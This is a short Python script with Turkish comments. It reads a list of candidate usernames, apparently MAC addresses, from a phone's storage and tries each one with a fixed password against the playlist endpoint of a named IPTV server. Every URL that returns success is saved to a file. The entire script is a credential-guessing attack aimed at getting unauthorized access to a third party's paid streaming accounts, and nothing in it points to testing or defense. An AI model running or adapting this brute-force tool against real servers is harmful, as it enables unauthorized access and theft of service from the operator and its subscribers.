import requests as req
import random


def yaz(kullanici): 
    dosya=open('/sdcard/m3u.txt','a+') 
    dosya.write(kullanici) 
    dosya.close() 
    
#Başlanğıç Satırı @FeyzullahK
#baslat= MAC.txt dosyasını dahili hafızaya ana dizini koyunuz.
bitir="ziajdjjfdifjd64646"
#Bitiş Satırı  Mr.Feyzo

#for i in range(baslat, bitir):
for i in open('/sdcard/mac.txt', 'r'):  # dosyamızdan verileri çektik. 

    link="http://xtra.xcs521.cz:8080/get.php?username=" + (i) + "&password=" + (bitir) + "&type=m3u_plus"
    
    resp = req.get(link)
    print (i, " deneniyor.." )
    
    if(resp.status_code==200):
        print (i," calisiyor. Dosyaya kaydedildi." )
        yaz(link+'\n')